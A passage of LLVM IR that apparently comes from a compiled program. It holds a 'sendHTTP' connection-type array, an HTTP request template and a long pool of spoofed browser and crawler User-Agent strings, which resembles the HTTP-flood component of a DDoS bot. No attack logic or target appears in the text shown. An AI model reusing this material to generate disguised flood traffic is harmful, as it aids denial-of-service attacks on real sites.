0), i8* getelementptr inbounds ([150 x i8], [150 x i8]* @.str.473, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.439, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.474, i32 0, i32 0), i8* getelementptr inbounds ([126 x i8], [126 x i8]* @.str.475, i32 0, i32 0), i8* getelementptr inbounds ([126 x i8], [126 x i8]* @.str.476, i32 0, i32 0), i8* getelementptr inbounds ([125 x i8], [125 x i8]* @.str.477, i32 0, i32 0), i8* getelementptr inbounds ([125 x i8], [125 x i8]* @.str.478, i32 0, i32 0), i8* getelementptr inbounds ([126 x i8], [126 x i8]* @.str.479, i32 0, i32 0), i8* getelementptr inbounds ([126 x i8], [126 x i8]* @.str.480, i32 0, i32 0), i8* getelementptr inbounds ([119 x i8], [119 x i8]* @.str.481, i32 0, i32 0), i8* getelementptr inbounds ([107 x i8], [107 x i8]* @.str.482, i32 0, i32 0), i8* getelementptr inbounds ([116 x i8], [116 x i8]* @.str.483, i32 0, i32 0), i8* getelementptr inbounds ([127 x i8], [127 x i8]* @.str.484, i32 0, i32 0), i8* getelementptr inbounds ([59 x i8], [59 x i8]* @.str.485, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.420, i32 0, i32 0), i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.486, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.487, i32 0, i32 0), i8* getelementptr inbounds ([118 x i8], [118 x i8]* @.str.412, i32 0, i32 0), i8* getelementptr inbounds ([208 x i8], [208 x i8]* @.str.488, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.489, i32 0, i32 0), i8* getelementptr inbounds ([118 x i8], [118 x i8]* @.str.395, i32 0, i32 0), i8* getelementptr inbounds ([106 x i8], [106 x i8]* @.str.490, i32 0, i32 0), i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.404, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.457, i32 0, i32 0), i8* getelementptr inbounds ([195 x i8], [195 x i8]* @.str.458, i32 0, i32 0), i8* getelementptr inbounds ([107 x i8], [107 x i8]* @.str.429, i32 0, i32 0), i8* getelementptr inbounds ([154 x i8], [154 x i8]* @.str.459, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.378, i32 0, i32 0), i8* getelementptr inbounds ([112 x i8], [112 x i8]* @.str.460, i32 0, i32 0), i8* getelementptr inbounds ([92 x i8], [92 x i8]* @.str.461, i32 0, i32 0), i8* getelementptr inbounds ([81 x i8], [81 x i8]* @.str.462, i32 0, i32 0), i8* getelementptr inbounds ([117 x i8], [117 x i8]* @.str.463, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.464, i32 0, i32 0), i8* getelementptr inbounds ([97 x i8], [97 x i8]* @.str.465, i32 0, i32 0), i8* getelementptr inbounds ([95 x i8], [95 x i8]* @.str.466, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.467, i32 0, i32 0), i8* getelementptr inbounds ([66 x i8], [66 x i8]* @.str.468, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.401, i32 0, i32 0), i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.491, i32 0, i32 0), i8* getelementptr inbounds ([77 x i8], [77 x i8]* @.str.469, i32 0, i32 0), i8* getelementptr inbounds ([134 x i8], [134 x i8]* @.str.492, i32 0, i32 0), i8* getelementptr inbounds ([131 x i8], [131 x i8]* @.str.470, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.471, i32 0, i32 0), i8* getelementptr inbounds ([76 x i8], [76 x i8]* @.str.417, i32 0, i32 0), i8* getelementptr inbounds ([107 x i8], [107 x i8]* @.str.429, i32 0, i32 0), i8* getelementptr inbounds ([109 x i8], [109 x i8]* @.str.472, i32 0, i32 0), i8* getelementptr inbounds ([150 x i8], [150 x i8]* @.str.473, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.439, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.474, i32 0, i32 0), i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.493, i32 0, i32 0), i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.494, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.495, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.496, i32 0, i32 0), i8* getelementptr inbounds ([112 x i8], [112 x i8]* @.str.497, i32 0, i32 0), i8* getelementptr inbounds ([126 x i8], [126 x i8]* @.str.475, i32 0, i32 0), i8* getelementptr inbounds ([126 x i8], [126 x i8]* @.str.476, i32 0, i32 0), i8* getelementptr inbounds ([125 x i8], [125 x i8]* @.str.477, i32 0, i32 0), i8* getelementptr inbounds ([125 x i8], [125 x i8]* @.str.478, i32 0, i32 0), i8* getelementptr inbounds ([126 x i8], [126 x i8]* @.str.479, i32 0, i32 0), i8* getelementptr inbounds ([126 x i8], [126 x i8]* @.str.480, i32 0, i32 0), i8* getelementptr inbounds ([119 x i8], [119 x i8]* @.str.481, i32 0, i32 0), i8* getelementptr inbounds ([107 x i8], [107 x i8]* @.str.482, i32 0, i32 0), i8* getelementptr inbounds ([116 x i8], [116 x i8]* @.str.483, i32 0, i32 0), i8* getelementptr inbounds ([127 x i8], [127 x i8]* @.str.484, i32 0, i32 0), i8* getelementptr inbounds ([59 x i8], [59 x i8]* @.str.485, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.197, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.420, i32 0, i32 0), i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.486, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.487, i32 0, i32 0), i8* getelementptr inbounds ([118 x i8], [118 x i8]* @.str.412, i32 0, i32 0), i8* getelementptr inbounds ([208 x i8], [208 x i8]* @.str.488, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.489, i32 0, i32 0), i8* getelementptr inbounds ([118 x i8], [118 x i8]* @.str.395, i32 0, i32 0), i8* getelementptr inbounds ([106 x i8], [106 x i8]* @.str.490, i32 0, i32 0), i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.404, i32 0, i32 0)], align 16
@sendHTTP.connections = private unnamed_addr constant [3 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.498, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.499, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.500, i32 0, i32 0)], align 16
@.str.501 = private unnamed_addr constant [62 x i8] c"%s %s HTTP/1.1\0D\0AConnection: %s\0D\0AAccept: */*\0D\0AUser-Agent: %s\0D\0A\00", align 1
@.str.498 = private unnamed_addr constant [6 x i8] c"close\00", align 1
@.str.499 = private unnamed_addr constant [11 x i8] c"keep-alive\00", align 1
@.str.500 = private unnamed_addr constant [7 x i8] c"accept\00", align 1
@.str.196 = private unnamed_addr constant [62 x i8] c"Mozilla/5.0 (compatible; Konqueror/3.0; i686 Linux; 20021117)\00", align 1
@.str.197 = private unnamed_addr constant [64 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5\00", align 1
@.str.198 = private unnamed_addr constant [144 x i8] c"Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10\00", align 1
@.str.199 = private unnamed_addr constant [55 x i8] c"Mozilla/5.0 Galeon/1.0.3 (X11; Linux i686; U;) Gecko/0\00", align 1
@.str.200 = private unnamed_addr constant [32 x i8] c"Opera/6.04 (Windows XP; U) [en]\00", align 1
@.str.201 = private unnamed_addr constant [24 x i8] c"Opera/9.99 (X11; U; sk)\00", align 1
@.str.202 = private unnamed_addr constant [86 x i8] c"Mozilla/6.0 (Future Star Technologies Corp. Star-Blade OS; U; en-US) iNet Browser 2.5\00", align 1
@.str.203 = private unnamed_addr constant [157 x i8] c"Mozilla/5.0(iPad; U; CPU iPhone OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B314 Safari/531.21.10gin_lib.cc\00", align 1
@.str.204 = private unnamed_addr constant [82 x i8] c"Mozilla/5.0 Galeon/1.2.9 (X11; Linux i686; U;) Gecko/20021213 Debian/1.2.9-0.bunk\00", align 1
@.str.205 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41\00", align 1
@.str.206 = private unnamed_addr constant [63 x i8] c"Mozilla/5.0 (compatible; iCab 3.0.3; Macintosh; U; PPC Mac OS)\00", align 1
@.str.207 = private unnamed_addr constant [182 x i8] c"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0\00", align 1
@.str.208 = private unnamed_addr constant [83 x i8] c"Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.9a8) Gecko/2007100620 GranParadiso/3.1\00", align 1
@.str.209 = private unnamed_addr constant [88 x i8] c"Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)\00", align 1
@.str.210 = private unnamed_addr constant [88 x i8] c"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.11) Gecko/20071128 Camino/1.5.4\00", align 1
@.str.211 = private unnamed_addr constant [64 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201\00", align 1
@.str.212 = private unnamed_addr constant [69 x i8] c"Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.6) Gecko/2009020911\00", align 1
@.str.213 = private unnamed_addr constant [88 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2\00", align 1
@.str.214 = private unnamed_addr constant [106 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)\00", align 1
@.str.215 = private unnamed_addr constant [87 x i8] c"Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285\00", align 1
@.str.216 = private unnamed_addr constant [80 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7\00", align 1
@.str.217 = private unnamed_addr constant [34 x i8] c"Mozilla/5.0 (PLAYSTATION 3; 3.55)\00", align 1
@.str.218 = private unnamed_addr constant [91 x i8] c"Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Thunderbird/38.2.0 Lightning/4.0.2\00", align 1
@.str.219 = private unnamed_addr constant [15 x i8] c"wii libnup/1.0\00", align 1
@.str.220 = private unnamed_addr constant [47 x i8] c"Mozilla/4.0 (PSP (PlayStation Portable); 2.00)\00", align 1
@.str.221 = private unnamed_addr constant [33 x i8] c"PSP (PlayStation Portable); 2.00\00", align 1
@.str.222 = private unnamed_addr constant [34 x i8] c"Bunjalloo/0.7.6(Nintendo DS;U;en)\00", align 1
@.str.223 = private unnamed_addr constant [26 x i8] c"Doris/1.15 [en] (Symbian)\00", align 1
@.str.224 = private unnamed_addr constant [61 x i8] c"BlackBerry7520/4.0.0 Profile/MIDP-2.0 Configuration/CLDC-1.1\00", align 1
@.str.225 = private unnamed_addr constant [78 x i8] c"BlackBerry9700/5.0.0.743 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/100\00", align 1
@.str.226 = private unnamed_addr constant [73 x i8] c"Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16\00", align 1
@.str.227 = private unnamed_addr constant [60 x i8] c"Opera/9.80 (Windows NT 5.1; U;) Presto/2.7.62 Version/11.01\00", align 1
@.str.228 = private unnamed_addr constant [92 x i8] c"Mozilla/5.0 (X11; Linux x86_64; U; de; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.62\00", align 1
@.str.229 = private unnamed_addr constant [101 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36\00", align 1
@.str.230 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Linux; Android 4.4.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile Safari/537.36\00", align 1
@.str.231 = private unnamed_addr constant [119 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.39 Safari/525.19\00", align 1
@.str.232 = private unnamed_addr constant [89 x i8] c"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; chromeframe/11.0.696.57)\00", align 1
@.str.233 = private unnamed_addr constant [81 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; uZardWeb/1.0; Server_JP)\00", align 1
@.str.234 = private unnamed_addr constant [134 x i8] c"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7; en-us) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Safari/530.17 Skyfire/2.0\00", align 1
@.str.235 = private unnamed_addr constant [83 x i8] c"SonyEricssonW800i/R1BD001/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1\00", align 1
@.str.236 = private unnamed_addr constant [103 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; FDM; MSIECrawler; Media Center PC 5.0)\00", align 1
@.str.237 = private unnamed_addr constant [91 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:5.0) Gecko/20110517 Firefox/5.0 Fennec/5.0\00", align 1
@.str.238 = private unnamed_addr constant [80 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts)\00", align 1
@.str.239 = private unnamed_addr constant [67 x i8] c"MOT-V300/0B.09.19R MIB/2.2 Profile/MIDP-2.0 Configuration/CLDC-1.0\00", align 1
@.str.240 = private unnamed_addr constant [82 x i8] c"Mozilla/5.0 (Android; Linux armv7l; rv:9.0) Gecko/20111216 Firefox/9.0 Fennec/9.0\00", align 1
@.str.241 = private unnamed_addr constant [75 x i8] c"Mozilla/5.0 (compatible; Teleca Q7; Brew 3.1.5; U; en) 480X800 LGE VX11000\00", align 1
@.str.242 = private unnamed_addr constant [67 x i8] c"MOT-L7/08.B7.ACR MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.1\00", align 1
@.str.243 = private unnamed_addr constant [83 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3\00", align 1
@.str.244 = private unnamed_addr constant [107 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)\00", align 1
@.str.245 = private unnamed_addr constant [110 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)\00", align 1
@.str.246 = private unnamed_addr constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1\00", align 1
@.str.247 = private unnamed_addr constant [116 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1\00", align 1
@.str.248 = private unnamed_addr constant [110 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)\00", align 1
@.str.249 = private unnamed_addr constant [150 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)\00", align 1
@.str.250 = private unnamed_addr constant [76 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)\00", align 1
@.str.251 = private unnamed_addr constant [101 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)\00", align 1
@.str.252 = private unnamed_addr constant [58 x i8] c"Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)\00", align 1
@.str.253 = private unnamed_addr constant [47 x i8] c"Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)\00", align 1
@.str.254 = private unnamed_addr constant [63 x i8] c"Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51\00", align 1
@.str.255 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko\00", align 1
@.str.256 = private unnamed_addr constant [83 x i8] c"Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko\00", align 1
@.str.257 = private unnamed_addr constant [173 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194ABaiduspider+(+http://www.baidu.com/search/spider.htm)\00", align 1
@.str.258 = private unnamed_addr constant [102 x i8] c"Mozilla/5.0 (compatible; BecomeBot/3.0; MSIE 6.0 compatible; +http://www.become.com/site_owners.html)\00", align 1
@.str.259 = private unnamed_addr constant [102 x i8] c"Mozilla/5.0 (compatible; BecomeBot/2.3; MSIE 6.0 compatible; +http://www.become.com/site_owners.html)\00", align 1
@.str.260 = private unnamed_addr constant [80 x i8] c"Mozilla/5.0 (compatible; BeslistBot; nl; BeslistBot 1.0; http://www.beslist.nl/\00", align 1
@.str.261 = private unnamed_addr constant [55 x i8] c"BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)\00", align 1
@.str.262 = private unnamed_addr constant [48 x i8] c"zspider/0.9-dev http://feedback.redkolibri.com/\00", align 1
@.str.263 = private unnamed_addr constant [91 x i8] c"Mozilla/4.0 compatible ZyBorg/1.0 DLC (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)\00", align 1
@.str.264 = private unnamed_addr constant [105 x i8] c"Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)\00", align 1
@.str.265 = private unnamed_addr constant [102 x i8] c"Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.dlc@looksmart.net; http://www.WISEnutbot.com)\00", align 1
@.str.266 = private unnamed_addr constant [87 x i8] c"Mozilla/4.0 compatible ZyBorg/1.0 (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)\00", align 1
@.str.267 = private unnamed_addr constant [90 x i8] c"Mozilla/4.0 compatible ZyBorg/1.0 (wn-16.zyborg@looksmart.net; http://www.WISEnutbot.com)\00", align 1
@.str.268 = private unnamed_addr constant [90 x i8] c"Mozilla/4.0 compatible ZyBorg/1.0 (wn-14.zyborg@looksmart.net; http://www.WISEnutbot.com)\00", align 1
@.str.269 = private unnamed_addr constant [86 x i8] c"Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )\00", align 1
@.str.270 = private unnamed_addr constant [93 x i8] c"Mozilla/2.0 (compatible; Ask Jeeves/Teoma; +http://sp.ask.com/docs/about/tech_crawling.html)\00", align 1
@.str.271 = private unnamed_addr constant [97 x i8] c"Mozilla/2.0 (compatible; Ask Jeeves/Teoma; +http://about.ask.com/en/docs/about/webmasters.shtml)\00", align 1
@.str.272 = private unnamed_addr constant [43 x i8] c"Mozilla/2.0 (compatible; Ask Jeeves/Teoma)\00", align 1
@.str.273 = private unnamed_addr constant [52 x i8] c"TerrawizBot/1.0 (+http://www.terrawiz.com/bot.html)\00", align 1
@.str.274 = private unnamed_addr constant [31 x i8] c"TheSuBot/0.2 (www.thesubot.de)\00", align 1
@.str.275 = private unnamed_addr constant [31 x i8] c"TheSuBot/0.1 (www.thesubot.de)\00", align 1
@.str.276 = private unnamed_addr constant [85 x i8] c"FAST-WebCrawler/3.8 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)\00", align 1
@.str.277 = private unnamed_addr constant [94 x i8] c"FAST-WebCrawler/3.7/FirstPage (atw-crawler at fast dot no;http://fast.no/support/crawler.asp)\00", align 1
@.str.278 = private unnamed_addr constant [85 x i8] c"FAST-WebCrawler/3.7 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)\00", align 1
@.str.279 = private unnamed_addr constant [94 x i8] c"FAST-WebCrawler/3.6/FirstPage (atw-crawler at fast dot no;http://fast.no/support/crawler.asp)\00", align 1
@.str.280 = private unnamed_addr constant [85 x i8] c"FAST-WebCrawler/3.6 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)\00", align 1
@.str.281 = private unnamed_addr constant [31 x i8] c"FAST-WebCrawler/3.x Multimedia\00", align 1
@.str.282 = private unnamed_addr constant [37 x i8] c"Mozilla/4.0 (compatible: FDSE robot)\00", align 1
@.str.283 = private unnamed_addr constant [63 x i8] c"findlinks/2.0.1 (+http://wortschatz.uni-leipzig.de/findlinks/)\00", align 1
@.str.284 = private unnamed_addr constant [69 x i8] c"findlinks/1.1.6-beta6 (+http://wortschatz.uni-leipzig.de/findlinks/)\00", align 1
@.str.285 = private unnamed_addr constant [69 x i8] c"findlinks/1.1.6-beta4 (+http://wortschatz.uni-leipzig.de/findlinks/)\00", align 1
@.str.286 = private unnamed_addr constant [69 x i8] c"findlinks/1.1.6-beta1 (+http://wortschatz.uni-leipzig.de/findlinks/)\00", align 1
@.str.287 = private unnamed_addr constant [69 x i8] c"findlinks/1.1.5-beta7 (+http://wortschatz.uni-leipzig.de/findlinks/)\00", align 1
@.str.288 = private unnamed_addr constant [81 x i8] c"Mozilla/5.0 (Windows; U; WinNT; en; rv:1.0.2) Gecko/20030311 Beonex/0.8.2-stable\00", align 1
@.str.289 = private unnamed_addr constant [78 x i8] c"Mozilla/5.0 (Windows; U; WinNT; en; Preview) Gecko/20020603 Beonex/0.8-stable\00", align 1
@.str.290 = private unnamed_addr constant [105 x i8] c"Mozilla/5.0 (X11; U; Linux i686; nl; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2 (Debian-1.99+2.0b2+dfsg-1)\00", align 1
@.str.291 = private unnamed_addr constant [81 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2\00", align 1
@.str.292 = private unnamed_addr constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1b2) Gecko/20060826 BonEcho/2.0b2\00", align 1
@.str.293 = private unnamed_addr constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.8.1b2) Gecko/20060831 BonEcho/2.0b2\00", align 1
@.str.294 = private unnamed_addr constant [97 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-GB; rv:1.8.1b1) Gecko/20060601 BonEcho/2.0b1 (Ubuntu-edgy)\00", align 1
@.str.295 = private unnamed_addr constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a3) Gecko/20060526 BonEcho/2.0a3\00", align 1
@.str.296 = private unnamed_addr constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2\00", align 1
@.str.297 = private unnamed_addr constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2\00", align 1
@.str.298 = private unnamed_addr constant [96 x i8] c"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2\00", align 1
@.str.299 = private unnamed_addr constant [71 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)\00", align 1
@.str.300 = private unnamed_addr constant [150 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: unblock4myspace)AppEngine-Google; (+http://code.google.com/appengine; appid: tunisproxy)\00", align 1
@.str.301 = private unnamed_addr constant [74 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-in-rs)\00", align 1
@.str.302 = private unnamed_addr constant [73 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-ba-k)\00", align 1
@.str.303 = private unnamed_addr constant [78 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: moelonepyaeshan)\00", align 1
@.str.304 = private unnamed_addr constant [71 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: mirrorrr)\00", align 1
@.str.305 = private unnamed_addr constant [84 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: mapremiereapplication)\00", align 1
@.str.306 = private unnamed_addr constant [79 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: longbows-hideout)\00", align 1
@.str.307 = private unnamed_addr constant [70 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: eduas23)\00", align 1
@.str.308 = private unnamed_addr constant [74 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: craigserver)\00", align 1
@.str.309 = private unnamed_addr constant [73 x i8] c"AppEngine-Google; ( http://code.google.com/appengine; appid: proxy-ba-k)\00", align 1
@.str.310 = private unnamed_addr constant [71 x i8] c"magpie-crawler/1.1 (U; Linux amd64; en-GB; +http://www.brandwatch.net)\00", align 1
@.str.311 = private unnamed_addr constant [80 x i8] c"Mozilla/5.0 (compatible; MJ12bot/v1.2.4; http://www.majestic12.co.uk/bot.php?+)\00", align 1
@.str.312 = private unnamed_addr constant [80 x i8] c"Mozilla/5.0 (compatible; MJ12bot/v1.2.3; http://www.majestic12.co.uk/bot.php?+)\00", align 1
@.str.313 = private unnamed_addr constant [51 x i8] c"MJ12bot/v1.0.8 (http://majestic12.co.uk/bot.php?+)\00", align 1
@.str.314 = private unnamed_addr constant [51 x i8] c"MJ12bot/v1.0.7 (http://majestic12.co.uk/bot.php?+)\00", align 1
@.str.315 = private unnamed_addr constant [72 x i8] c"Mozilla/5.0 (compatible; MojeekBot/2.0; http://www.mojeek.com/bot.html)\00", align 1
@.str.316 = private unnamed_addr constant [54 x i8] c"MojeekBot/0.2 (archi; http://www.mojeek.com/bot.html)\00", align 1
@.str.317 = private unnamed_addr constant [77 x i8] c"Moreoverbot/5.1 ( http://w.moreover.com; webmaster@moreover.com) Mozilla/5.0\00", align 1
@.str.318 = private unnamed_addr constant [68 x i8] c"Moreoverbot/5.00 (+http://www.moreover.com; webmaster@moreover.com)\00", align 1
@.str.319 = private unnamed_addr constant [47 x i8] c"msnbot/1.0 (+http://search.msn.com/msnbot.htm)\00", align 1
@.str.320 = private unnamed_addr constant [47 x i8] c"msnbot/0.9 (+http://search.msn.com/msnbot.htm)\00", align 1
@.str.321 = private unnamed_addr constant [48 x i8] c"msnbot/0.11 ( http://search.msn.com/msnbot.htm)\00", align 1
@.str.322 = private unnamed_addr constant [46 x i8] c"MSNBOT/0.1 (http://search.msn.com/msnbot.htm)\00", align 1
@.str.323 = private unnamed_addr constant [71 x i8] c"Mozilla/5.0 (compatible; mxbot/1.0; +http://www.chainn.com/mxbot.html)\00", align 1
@.str.324 = private unnamed_addr constant [70 x i8] c"Mozilla/5.0 (compatible; mxbot/1.0; http://www.chainn.com/mxbot.html)\00", align 1
@.str.325 = private unnamed_addr constant [55 x i8] c"NetResearchServer/4.0(loopimprovements.com/robot.html)\00", align 1
@.str.326 = private unnamed_addr constant [55 x i8] c"NetResearchServer/3.5(loopimprovements.com/robot.html)\00", align 1
@.str.327 = private unnamed_addr constant [55 x i8] c"NetResearchServer/2.8(loopimprovements.com/robot.html)\00", align 1
@.str.328 = private unnamed_addr constant [55 x i8] c"NetResearchServer/2.7(loopimprovements.com/robot.html)\00", align 1
@.str.329 = private unnamed_addr constant [55 x i8] c"NetResearchServer/2.5(loopimprovements.com/robot.html)\00", align 1
@.str.330 = private unnamed_addr constant [83 x i8] c"Mozilla/5.0 (compatible; Baiduspider/2.0;+http://www.baidu.com/search/spider.html)\00", align 1
@.str.331 = private unnamed_addr constant [55 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;SV1)\00", align 1
@.str.332 = private unnamed_addr constant [84 x i8] c"Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html)\00", align 1
@.str.333 = private unnamed_addr constant [113 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)\00", align 1
